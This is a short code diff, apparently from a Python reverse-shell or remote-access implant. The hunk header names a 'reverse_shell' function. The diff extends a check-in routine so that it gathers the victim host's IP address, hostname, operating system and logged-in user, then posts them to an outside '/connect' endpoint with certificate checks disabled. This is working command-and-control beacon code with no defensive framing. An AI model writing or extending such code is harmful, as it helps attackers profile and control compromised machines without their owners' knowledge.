@@ -36,7 +36,9 @@ def reverse_shell(address: str, port: int):
 
 data = {
     "address": socket.gethostbyname(socket.gethostname()),
-    "hostname": sp.getoutput("hostname")
+    "hostname": sp.getoutput("hostname"),
+    "os": sp.getoutput("uname").lower(),
+    "user": sp.getoutput("whoami")
 }
 name = r.post(f"{URL}/connect", json=data, verify=False).text
 
